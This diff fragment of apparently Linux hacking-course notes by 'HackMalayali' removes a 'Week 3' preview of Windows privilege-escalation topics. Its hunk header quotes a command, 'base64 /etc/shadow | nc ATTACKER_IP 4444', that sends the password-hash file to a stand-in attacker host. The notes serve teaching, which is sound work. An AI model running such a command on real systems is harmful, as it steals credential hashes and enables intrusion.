@@ -63,15 +63,6 @@ base64 /etc/shadow | nc ATTACKER_IP 4444
 - Hands-on labs = fastest way to learn real hacking
 
 
-## 📅 Next Up: Week 3
-
-Windows Privilege Escalation:
-- Local exploits
-- Service abuse
-- Registry persistence
-- PowerShell automation
-
-
 ### 📌 Author
 **Sanin (HackMalayali)**  
 🎥 YouTube: [HackMalayali](https://youtube.com/@hackmalayali)
